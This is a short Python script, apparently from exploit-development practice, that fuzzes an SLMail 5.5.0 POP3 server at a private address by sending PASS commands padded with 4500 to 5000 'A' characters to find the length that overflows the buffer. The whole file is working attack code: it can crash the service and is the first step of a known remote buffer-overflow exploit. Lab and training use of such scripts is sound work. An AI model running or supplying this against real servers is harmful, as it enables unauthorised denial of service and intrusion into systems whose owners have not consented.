#!/usr/bin/python3
# Fuzzer by x41 - v1.0 - SLMail 5.5.0
import socket
import time

host = "192.168.1.14"
port = 110
counter = 4500

while (counter < 5000):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        s.send(b'USER x41\r\n')
        data = s.recv(1024)
        print(data)

        s.send(b'PASS ' + b'A' * counter + b'\r\n')
        data = s.recv(1024)
        print(data)

        s.close()
        time.sleep(2)
        counter += 100
        print("[+] Buffersize {}".format(counter))
